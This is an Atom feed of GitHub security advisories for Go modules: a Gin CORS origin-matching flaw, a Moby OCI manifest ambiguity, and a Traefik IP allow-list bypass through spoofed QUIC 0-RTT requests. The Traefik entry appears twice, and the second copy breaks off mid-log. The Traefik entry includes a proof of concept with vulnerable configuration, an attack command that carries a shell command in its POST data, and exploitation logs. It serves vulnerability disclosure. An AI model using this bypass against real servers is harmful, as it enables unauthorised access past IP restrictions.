<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-07-08T12:02:00.756Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/gin-contrib/cors] Gin mishandles a wildcard at the end of an origin string]]></title>
        <id>https://github.com/advisories/GHSA-869c-j7wc-8jqv</id>
        <link href="https://github.com/advisories/GHSA-869c-j7wc-8jqv"/>
        <updated>2024-07-05T21:27:43.000Z</updated>
        <content type="html"><![CDATA[<p>parseWildcardRules in Gin-Gonic CORS middleware before 1.6.0 mishandles a wildcard at the end of an origin string, e.g., <a href="https://example.community/">https://example.community/</a>* is allowed when the intention is that only <a href="https://example.com/">https://example.com/</a>* should be allowed, and <a href="http://localhost.example.com/">http://localhost.example.com/</a>* is allowed when the intention is that only <a href="http://localhost/">http://localhost/</a>* should be allowed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-25211">https://nvd.nist.gov/vuln/detail/CVE-2019-25211</a></li>
<li><a href="https://github.com/gin-contrib/cors/pull/106">https://github.com/gin-contrib/cors/pull/106</a></li>
<li><a href="https://github.com/gin-contrib/cors/pull/57">https://github.com/gin-contrib/cors/pull/57</a></li>
<li><a href="https://github.com/gin-contrib/cors/commit/27b723a473efd80d5a498fa9f5933c80204c850d">https://github.com/gin-contrib/cors/commit/27b723a473efd80d5a498fa9f5933c80204c850d</a></li>
<li><a href="https://github.com/gin-contrib/cors/compare/v1.5.0...v1.6.0">https://github.com/gin-contrib/cors/compare/v1.5.0...v1.6.0</a></li>
<li><a href="https://github.com/gin-contrib/cors/releases/tag/v1.6.0">https://github.com/gin-contrib/cors/releases/tag/v1.6.0</a></li>
<li><a href="https://github.com/advisories/GHSA-869c-j7wc-8jqv">https://github.com/advisories/GHSA-869c-j7wc-8jqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-869c-j7wc-8jqv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-29T06:31:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/moby/moby] Moby (Docker Engine) is vulnerable to Ambiguous OCI manifest parsing]]></title>
        <id>https://github.com/advisories/GHSA-xmmx-7jpf-fx42</id>
        <link href="https://github.com/advisories/GHSA-xmmx-7jpf-fx42"/>
        <updated>2024-07-05T20:52:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In the OCI Distribution Specification version 1.0.0 and prior and in the OCI Image Specification version 1.0.1 and prior, manifest and index documents are ambiguous without an accompanying Content-Type HTTP header.  Versions of Moby (Docker Engine) prior to 20.10.11 treat the Content-Type header as trusted and deserialize the document according to that header.  If the Content-Type header changed between pulls of the same ambiguous document (with the same digest), the document may be interpreted differently, meaning that the digest alone is insufficient to unambiguously identify the content of the image.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been fixed in Moby (Docker Engine) 20.10.11.  Image pulls for manifests that contain a “manifests” field or indices which contain a “layers” field are rejected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure you only pull images from trusted sources.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m">https://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m</a>
<a href="https://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh">https://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/moby/moby/issues/new">Open an issue in</a></li>
<li>Email us at <a href="mailto:security@docker.com">security@docker.com</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-xmmx-7jpf-fx42">https://github.com/moby/moby/security/advisories/GHSA-xmmx-7jpf-fx42</a></li>
<li><a href="https://github.com/advisories/GHSA-xmmx-7jpf-fx42">https://github.com/advisories/GHSA-xmmx-7jpf-fx42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xmmx-7jpf-fx42</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-10T18:39:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik] Bypassing IP allow-lists in traefik via HTTP/3 early data requests in QUIC 0-RTT handshakes]]></title>
        <id>https://github.com/advisories/GHSA-gxrv-wf35-62w9</id>
        <link href="https://github.com/advisories/GHSA-gxrv-wf35-62w9"/>
        <updated>2024-07-05T20:13:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There is a vulnerability in Traefik that allows bypassing IP allow-lists via HTTP/3 early data requests in QUIC 0-RTT handshakes sent with spoofed IP addresses.</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.6">https://github.com/traefik/traefik/releases/tag/v2.11.6</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.0.4">https://github.com/traefik/traefik/releases/tag/v3.0.4</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3">https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary
Bypassing IP allow-lists in traefik via HTTP/3 early data requests in QUIC 0-RTT handshakes sent with spoofed IP addresses.


<h3 id="details">Details</h3>
<p>HTTP/3 supports sending HTTP requests as early data during QUIC 0-RTT handshakes to reduce RTT overhead for connection resumptions. Early data is sent and received before the handshake is completed and the client's IP address is validated.
The initial packet containing the QUIC 0-RTT handshake information and the early data HTTP request are sent as a single UDP datagram. Due to UDP being used by QUIC, the source IP address can be spoofed. When HTTP/3 servers process early data requests, the application layer only sees the unvalidated - possibly spoofed - IP address.</p>
<p>First, attackers have to obtain a session ticket from the HTTP/3 server. For that, attackers have to establish an HTTP/3 connection to the server - using their real IP address - and wait for the server to send a session ticket. Note that attackers do not have to send an actual HTTP request over the established connection. After obtaining the session ticket, the attacker can close the connection. In the second step, attackers need to prepare a UDP datagram containing a QUIC initial packet with a TLS ClientHello and the session ticket, a QUIC 0-RTT packet with early data encrypted with the pre-shared key from the session ticket, and an HTTP/3 request (open request stream, HEADERS frame, optionally DATA frame). This prepared UDP datagram can then be sent to the server with an arbitrarily spoofed source IP address in the IP packet header. When processing the HTTP request, the server trusts the spoofed IP address, which can be used to bypass IP-allow/block-lists.</p>
<p>A prerequisite for this attack to succeed is that HTTP/3 servers have implemented and enabled 0-RTT early data for HTTP/3 requests (and no mitigations are in place). A caveat is that attackers are not able to receive the server's response because the response is sent to the spoofed source IP address, making it a blind attack. Another limitation is that the request has to fit in a single UDP datagram, whose size is limited by the network path's MTU (minus some bytes for headers of encapsulating protocols such as HTTP/3, QUIC, UDP, IPv4/IPv6).</p>
<h3 id="impact-1">Impact</h3>
<p>IP allow-lists can be bypassed. Early data in QUIC 0-RTT handshakes is enabled when HTTP/3 support is enabled.</p>
<h3 id="mitigation">Mitigation</h3>
<ul>
<li>Consider responding with HTTP status code 425 Too Early when 0-RTT early data requests match <code>ipAllowList.sourceRange</code> middleware. See RFC 8470 Section 3 for more information.</li>
<li>Alternatively, delay processing of 0-RTT early data requests until the handshake is completed and the client's IP address is validated when 0-RTT early data requests match <code>ipAllowList.sourceRange</code> middleware.</li>
</ul>
<p>Additionally, it is recommended to implement RFC 8470 and set the <code>Early-Data: 1</code> header when forwarding early data requests to backend services. Currently, applications are not able to distinguish between 0-RTT early data requests and regular requests. When applications use the client's IP in <code>X-Forwarded-For</code> headers (e.g. for rate limiting), they are not able to detect potential IP spoofing on the application layer.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>Traefik is used as a HTTP/3 reverse proxy for a backend application. An IP allow list is configured to only allow access from the IP address 1.3.3.7.</p>
<pre><code class="language-yaml"># /etc/traefik/traefik.yml
entryPoints:
  websecure:
    address: ":4439"
    http3: {}
    asDefault: true

providers:
  file:
    filename: /etc/traefik/provider.yml

log:
  level: DEBUG
</code></pre>
<pre><code class="language-yaml"># /etc/traefik/provider.yml
http:
  routers:
    default:
      rule: "PathPrefix(`/`)"
      tls: {}
      middlewares:
        - ipfilter
      service: backend
  
  middlewares:
    ipfilter:
      ipAllowList:
        sourceRange:
          - "1.3.3.7/32"

  services:
    backend:
      loadBalancer:
        servers:
          - url: "http://127.0.0.1:8000"
</code></pre>
<p>By performing the steps described above, attackers are able to bypass the IP allow list and send requests to the backend application. The security impact depends on the application's logic.</p>
<p>Please find attached a proof-of-concept docker-compose setup to demonstrate the vulnerability. It consists of a traefik reverse proxy, a backend application, and an attacker container. The attack script performs following request:</p>
<pre><code>python3 http3_ip_spoofing.py https://127.0.0.1:4439/cmd -X POST -d "cmd=echo%20worked&gt;&gt;/tmp/spoofed" -H "X-Header: test" --spoofed-ip=1.3.3.7
</code></pre>
<p>Note: We use a custom python script because, <code>curl</code> does not support QUIC 0-RTT requests and session resumtion yet.</p>
<p><a href="https://github.com/user-attachments/files/16044048/proof-of-concept.zip">proof-of-concept.zip</a></p>
<p>Here are logs of a successful exploitation in the attached docker compose setup:</p>
<pre><code>docker compose up

# Traefik startup logs
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/cmd/traefik/traefik.go:100 &gt; Traefik version 3.0.3 built on 2024-06-18T14:31:20Z version=3.0.3
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/cmd/traefik/traefik.go:107 &gt; Static configuration loaded [json] staticConfiguration={"entryPoints":{"websecure":{"address":":4439","asDefault":true,"forwardedHeaders":{},"http":{},"http2":{"maxConcurrentStreams":250},"http3":{},"transport":{"lifeCycle":{"graceTimeOut":"10s"},"respondingTimeouts":{"idleTimeout":"3m0s","readTimeout":"1m0s"}},"udp":{"timeout":"3s"}}},"global":{"checkNewVersion":true},"log":{"format":"common","level":"DEBUG"},"providers":{"file":{"filename":"/etc/traefik/provider.yml","watch":true},"providersThrottleDuration":"2s"},"serversTransport":{"maxIdleConnsPerHost":200},"tcpServersTransport":{"dialKeepAlive":"15s","dialTimeout":"30s"}}
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/cmd/traefik/traefik.go:605 &gt; 
h3_traefik-1         | Stats collection is disabled.
h3_traefik-1         | Help us improve Traefik by turning this feature on :)
h3_traefik-1         | More details on: https://doc.traefik.io/traefik/contributing/data-collection/
h3_traefik-1         | 
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:73 &gt; Starting provider aggregator aggregator.ProviderAggregator
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/server_entrypoint_tcp.go:220 &gt; Starting TCP Server entryPointName=websecure
h3_traefik-1         | 2024-06-29T11:52:58Z DBG log/log.go:245 &gt; 2024/06/29 11:52:58 sys_conn.go:36: failed to sufficiently increase receive buffer size (was: 208 kiB, wanted: 2048 kiB, got: 416 kiB). See https://github.com/quic-go/quic-go/wiki/UDP-Buffer-Sizes for details.
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *file.Provider
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *file.Provider provider configuration config={"filename":"/etc/traefik/provider.yml","watch":true}
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/file/file.go:122 &gt; add watcher on: /etc/traefik
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/file/file.go:122 &gt; add watcher on: /etc/traefik/provider.yml
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *traefik.Provider
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *traefik.Provider provider configuration config={}
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *acme.ChallengeTLSALPN
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *acme.ChallengeTLSALPN provider configuration config={}
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:227 &gt; Configuration received config={"http":{"middlewares":{"ipfilter":{"ipAllowList":{"sourceRange":["1.3.3.7/32"]}}},"routers":{"default":{"middlewares":["ipfilter"],"rule":"PathPrefix(`/`)","service":"backend","tls":{}}},"services":{"backend":{"loadBalancer":{"passHostHeader":true,"responseForwarding":{"flushInterval":"100ms"},"servers":[{"url":"http://127.0.0.1:8000"}]}}}},"tcp":{},"tls":{},"udp":{}} providerName=file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:227 &gt; Configuration received config={"http":{"serversTransports":{"default":{"maxIdleConnsPerHost":200}},"services":{"noop":{}}},"tcp":{"serversTransports":{"default":{"dialKeepAlive":"15s","dialTimeout":"30s"}}},"tls":{},"udp":{}} providerName=internal
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/aggregator.go:51 &gt; No entryPoint defined for this router, using the default one(s) instead entryPointName=["websecure"] routerName=default
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/tls/tlsmanager.go:321 &gt; No default certificate, fallback to the internal generated certificate tlsStoreName=default
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/service/service.go:259 &gt; Creating load-balancer entryPointName=websecure routerName=default@file serviceName=backend@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/service/service.go:301 &gt; Creating server entryPointName=websecure routerName=default@file serverName=754e0da3b063885a serviceName=backend@file target=http://127.0.0.1:8000
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:33 &gt; Creating middleware entryPointName=websecure middlewareName=ipfilter@file middlewareType=IPAllowLister routerName=default@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:57 &gt; Setting up IPAllowLister with sourceRange: [1.3.3.7/32] entryPointName=websecure middlewareName=ipfilter@file middlewareType=IPAllowLister routerName=default@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/observability/middleware.go:33 &gt; Adding tracing to middleware entryPointName=websecure middlewareName=ipfilter@file routerName=default@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/recovery/recovery.go:22 &gt; Creating middleware entryPointName=websecure middlewareName=traefik-internal-recovery middlewareType=Recover

# Attack script establishes an HTTP/3 connection to traefik to obtain a session ticket
attack-ipspoofing-1  | INFO:client:Initially connecting to server to get a session ticket
attack-ipspoofing-1  | INFO:quic:[e29b2e2fd9a76162] ALPN negotiated protocol h3
attack-ipspoofing-1  | INFO:quic:[e29b2e2fd9a76162] Connection close sent (code 0x0, reason )
attack-ipspoofing-1  | INFO:client:Initial connection done

# Traefik accepts the HTTP/3 connection and issues as session ticket 
h3_traefik-1         | 2024-06-29T11:53:03Z DBG github.com/traefik/traefik/v3/pkg/tls/tlsmanager.go:228 &gt; Serving default certificate for request: ""

# Attack script sends a 0-RTT early data request in a UDP datagram with a spoofed source IP
attack-ipspoofing-1  | INFO:client:Building 0-RTT QUIC packet
attack-ipspoofing-1  | INFO:client:Setting up iptables rule for source IP spoofing
attack-ipspoofing-1  | INFO:client:Sending 0-RTT packet

# Traefik accepts and forwards the request to the backend service, bypassing the IP allow list
h3_traefik-1         | 2024-06-29T11:53:05Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:85 &gt; Accepting IP 1.3.3.7 middlewareName=ipfilter@file middlewareType=IPAllowLister
h3_traefik-1         | 2024-06-29T11:53:05Z DBG github.com/traefik/traefik/v3/pkg/server/service/loadbalancer/wrr/wrr.go:196 &gt; Service selected by WRR: 754e0da3b063885a

# Backend service receives and processes the request
backend-1            | INFO:root:Request: {"ip": "1.3.3.7", "method": "POST", "path": "/cmd", "data": "cmd=echo%20worked&gt;&gt;/tmp/spoofed", "headers": {"Host": "127.0.0.1:4439", "Content-Length": "31", "Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "1.3.3.7", "X-Forwarded-Host": "127.0.0.1:4439", "X-Forwarded-Port": "4439", "X-Forwarded-Proto": "https", "X-Forwarded-Server": "work", "X-Header": "test", "X-Real-Ip": "1.3.3.7", "Accept-Encoding": "gzip"}}
backend-1            | INFO:root:Executing command: echo worked&gt;&gt;/tmp/spoofed
</code></pre>
</details>
### References

<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-gxrv-wf35-62w9">https://github.com/traefik/traefik/security/advisories/GHSA-gxrv-wf35-62w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39321">https://nvd.nist.gov/vuln/detail/CVE-2024-39321</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.6">https://github.com/traefik/traefik/releases/tag/v2.11.6</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.0.4">https://github.com/traefik/traefik/releases/tag/v3.0.4</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3">https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3</a></li>
<li><a href="https://github.com/advisories/GHSA-gxrv-wf35-62w9">https://github.com/advisories/GHSA-gxrv-wf35-62w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gxrv-wf35-62w9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-05T20:13:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik] Bypassing IP allow-lists in traefik via HTTP/3 early data requests in QUIC 0-RTT handshakes]]></title>
        <id>https://github.com/advisories/GHSA-gxrv-wf35-62w9</id>
        <link href="https://github.com/advisories/GHSA-gxrv-wf35-62w9"/>
        <updated>2024-07-05T20:13:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There is a vulnerability in Traefik that allows bypassing IP allow-lists via HTTP/3 early data requests in QUIC 0-RTT handshakes sent with spoofed IP addresses.</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.6">https://github.com/traefik/traefik/releases/tag/v2.11.6</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.0.4">https://github.com/traefik/traefik/releases/tag/v3.0.4</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3">https://github.com/traefik/traefik/releases/tag/v3.1.0-rc3</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
<details>
<summary>Original Description</summary>
### Summary
Bypassing IP allow-lists in traefik via HTTP/3 early data requests in QUIC 0-RTT handshakes sent with spoofed IP addresses.


<h3 id="details">Details</h3>
<p>HTTP/3 supports sending HTTP requests as early data during QUIC 0-RTT handshakes to reduce RTT overhead for connection resumptions. Early data is sent and received before the handshake is completed and the client's IP address is validated.
The initial packet containing the QUIC 0-RTT handshake information and the early data HTTP request are sent as a single UDP datagram. Due to UDP being used by QUIC, the source IP address can be spoofed. When HTTP/3 servers process early data requests, the application layer only sees the unvalidated - possibly spoofed - IP address.</p>
<p>First, attackers have to obtain a session ticket from the HTTP/3 server. For that, attackers have to establish an HTTP/3 connection to the server - using their real IP address - and wait for the server to send a session ticket. Note that attackers do not have to send an actual HTTP request over the established connection. After obtaining the session ticket, the attacker can close the connection. In the second step, attackers need to prepare a UDP datagram containing a QUIC initial packet with a TLS ClientHello and the session ticket, a QUIC 0-RTT packet with early data encrypted with the pre-shared key from the session ticket, and an HTTP/3 request (open request stream, HEADERS frame, optionally DATA frame). This prepared UDP datagram can then be sent to the server with an arbitrarily spoofed source IP address in the IP packet header. When processing the HTTP request, the server trusts the spoofed IP address, which can be used to bypass IP-allow/block-lists.</p>
<p>A prerequisite for this attack to succeed is that HTTP/3 servers have implemented and enabled 0-RTT early data for HTTP/3 requests (and no mitigations are in place). A caveat is that attackers are not able to receive the server's response because the response is sent to the spoofed source IP address, making it a blind attack. Another limitation is that the request has to fit in a single UDP datagram, whose size is limited by the network path's MTU (minus some bytes for headers of encapsulating protocols such as HTTP/3, QUIC, UDP, IPv4/IPv6).</p>
<h3 id="impact-1">Impact</h3>
<p>IP allow-lists can be bypassed. Early data in QUIC 0-RTT handshakes is enabled when HTTP/3 support is enabled.</p>
<h3 id="mitigation">Mitigation</h3>
<ul>
<li>Consider responding with HTTP status code 425 Too Early when 0-RTT early data requests match <code>ipAllowList.sourceRange</code> middleware. See RFC 8470 Section 3 for more information.</li>
<li>Alternatively, delay processing of 0-RTT early data requests until the handshake is completed and the client's IP address is validated when 0-RTT early data requests match <code>ipAllowList.sourceRange</code> middleware.</li>
</ul>
<p>Additionally, it is recommended to implement RFC 8470 and set the <code>Early-Data: 1</code> header when forwarding early data requests to backend services. Currently, applications are not able to distinguish between 0-RTT early data requests and regular requests. When applications use the client's IP in <code>X-Forwarded-For</code> headers (e.g. for rate limiting), they are not able to detect potential IP spoofing on the application layer.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>Traefik is used as a HTTP/3 reverse proxy for a backend application. An IP allow list is configured to only allow access from the IP address 1.3.3.7.</p>
<pre><code class="language-yaml"># /etc/traefik/traefik.yml
entryPoints:
  websecure:
    address: ":4439"
    http3: {}
    asDefault: true

providers:
  file:
    filename: /etc/traefik/provider.yml

log:
  level: DEBUG
</code></pre>
<pre><code class="language-yaml"># /etc/traefik/provider.yml
http:
  routers:
    default:
      rule: "PathPrefix(`/`)"
      tls: {}
      middlewares:
        - ipfilter
      service: backend
  
  middlewares:
    ipfilter:
      ipAllowList:
        sourceRange:
          - "1.3.3.7/32"

  services:
    backend:
      loadBalancer:
        servers:
          - url: "http://127.0.0.1:8000"
</code></pre>
<p>By performing the steps described above, attackers are able to bypass the IP allow list and send requests to the backend application. The security impact depends on the application's logic.</p>
<p>Please find attached a proof-of-concept docker-compose setup to demonstrate the vulnerability. It consists of a traefik reverse proxy, a backend application, and an attacker container. The attack script performs following request:</p>
<pre><code>python3 http3_ip_spoofing.py https://127.0.0.1:4439/cmd -X POST -d "cmd=echo%20worked&gt;&gt;/tmp/spoofed" -H "X-Header: test" --spoofed-ip=1.3.3.7
</code></pre>
<p>Note: We use a custom python script because, <code>curl</code> does not support QUIC 0-RTT requests and session resumtion yet.</p>
<p><a href="https://github.com/user-attachments/files/16044048/proof-of-concept.zip">proof-of-concept.zip</a></p>
<p>Here are logs of a successful exploitation in the attached docker compose setup:</p>
<pre><code>docker compose up

# Traefik startup logs
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/cmd/traefik/traefik.go:100 &gt; Traefik version 3.0.3 built on 2024-06-18T14:31:20Z version=3.0.3
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/cmd/traefik/traefik.go:107 &gt; Static configuration loaded [json] staticConfiguration={"entryPoints":{"websecure":{"address":":4439","asDefault":true,"forwardedHeaders":{},"http":{},"http2":{"maxConcurrentStreams":250},"http3":{},"transport":{"lifeCycle":{"graceTimeOut":"10s"},"respondingTimeouts":{"idleTimeout":"3m0s","readTimeout":"1m0s"}},"udp":{"timeout":"3s"}}},"global":{"checkNewVersion":true},"log":{"format":"common","level":"DEBUG"},"providers":{"file":{"filename":"/etc/traefik/provider.yml","watch":true},"providersThrottleDuration":"2s"},"serversTransport":{"maxIdleConnsPerHost":200},"tcpServersTransport":{"dialKeepAlive":"15s","dialTimeout":"30s"}}
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/cmd/traefik/traefik.go:605 &gt; 
h3_traefik-1         | Stats collection is disabled.
h3_traefik-1         | Help us improve Traefik by turning this feature on :)
h3_traefik-1         | More details on: https://doc.traefik.io/traefik/contributing/data-collection/
h3_traefik-1         | 
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:73 &gt; Starting provider aggregator aggregator.ProviderAggregator
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/server_entrypoint_tcp.go:220 &gt; Starting TCP Server entryPointName=websecure
h3_traefik-1         | 2024-06-29T11:52:58Z DBG log/log.go:245 &gt; 2024/06/29 11:52:58 sys_conn.go:36: failed to sufficiently increase receive buffer size (was: 208 kiB, wanted: 2048 kiB, got: 416 kiB). See https://github.com/quic-go/quic-go/wiki/UDP-Buffer-Sizes for details.
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *file.Provider
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *file.Provider provider configuration config={"filename":"/etc/traefik/provider.yml","watch":true}
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/file/file.go:122 &gt; add watcher on: /etc/traefik
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/file/file.go:122 &gt; add watcher on: /etc/traefik/provider.yml
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *traefik.Provider
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *traefik.Provider provider configuration config={}
h3_traefik-1         | 2024-06-29T11:52:58Z INF github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:202 &gt; Starting provider *acme.ChallengeTLSALPN
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/provider/aggregator/aggregator.go:203 &gt; *acme.ChallengeTLSALPN provider configuration config={}
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:227 &gt; Configuration received config={"http":{"middlewares":{"ipfilter":{"ipAllowList":{"sourceRange":["1.3.3.7/32"]}}},"routers":{"default":{"middlewares":["ipfilter"],"rule":"PathPrefix(`/`)","service":"backend","tls":{}}},"services":{"backend":{"loadBalancer":{"passHostHeader":true,"responseForwarding":{"flushInterval":"100ms"},"servers":[{"url":"http://127.0.0.1:8000"}]}}}},"tcp":{},"tls":{},"udp":{}} providerName=file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:227 &gt; Configuration received config={"http":{"serversTransports":{"default":{"maxIdleConnsPerHost":200}},"services":{"noop":{}}},"tcp":{"serversTransports":{"default":{"dialKeepAlive":"15s","dialTimeout":"30s"}}},"tls":{},"udp":{}} providerName=internal
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/aggregator.go:51 &gt; No entryPoint defined for this router, using the default one(s) instead entryPointName=["websecure"] routerName=default
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/tls/tlsmanager.go:321 &gt; No default certificate, fallback to the internal generated certificate tlsStoreName=default
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/service/service.go:259 &gt; Creating load-balancer entryPointName=websecure routerName=default@file serviceName=backend@file
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/server/service/service.go:301 &gt; Creating server entryPointName=websecure routerName=default@file serverName=754e0da3b063885a serviceName=backend@file target=http://127.0.0.1:8000
h3_traefik-1         | 2024-06-29T11:52:58Z DBG github.com/traefik/traefik/v3/pkg/middlewares/ipallowlist/ip_allowlist.go:33 &gt; Creating middleware entryPointName=websecure middlewareName=ipfilter@file middlewareType=IPAllowLister routerName=default@file
